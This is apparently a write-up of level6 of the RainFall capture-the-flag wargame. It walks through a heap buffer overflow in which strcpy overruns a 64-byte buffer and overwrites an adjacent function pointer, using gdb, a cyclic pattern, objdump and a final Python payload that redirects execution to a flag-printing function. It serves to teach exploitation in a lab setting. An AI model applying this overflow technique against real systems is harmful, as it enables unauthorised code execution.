First, let's analyze the source code.

We can see that :
    
- The main function allocate 2 pointer one for a string with a size of 64 char and one function pointer with a size of 4 bytes.
- It store the address of the function `m` in the function pointer
- The main copy `argv[1]` in the buffer (`dest`) with a `strcpy`
- And finish by executing the function at the address store in the function pointer
- In the source code there is 2 other function :
    - The function `m` write "Nope"
    - The function `n` cat the flag


Let's focus on the mallocs, since they allocate memory one after the other, since the char buffer is allocate first we can use the buffer `dest` to overwrite the function pointer with the address of `n`

To do this, we will start by determining the offset needed to make the buffer(`dest`) overwrite the function pointer, using [wiremask](https://wiremask.eu/tools/buffer-overflow-pattern-generator).
``` Shell
level6@RainFall:~$ gdb level6
GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
Copyright (C) 2012 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i686-linux-gnu".
For bug reporting instructions, please see:
<http://bugs.launchpad.net/gdb-linaro/>...
Reading symbols from /home/user/level6/level6...(no debugging symbols found)...done.
(gdb) r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
Starting program: /home/user/level6/level6 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

Program received signal SIGSEGV, Segmentation fault.
0x41346341 in ?? ()
```
When we put `0x41346341` in [wiremask](https://wiremask.eu/tools/buffer-overflow-pattern-generator) it find an offset of 72.


After that, we will look for the pointer to n.


```Shell
objdump -t level6
...
08049824  w      .data  00000000              data_start
08048454 g     F .text  00000014              n
0804982c g       *ABS*  00000000              _edata
...
```

address of `n` : `08048454`
little-endian : `/x54/x84/x04/x08`

Putting this together give us :
```Shell
./level6 $(python -c 'print "A" * 72 + "\x54\x84\x04\x08"')
```
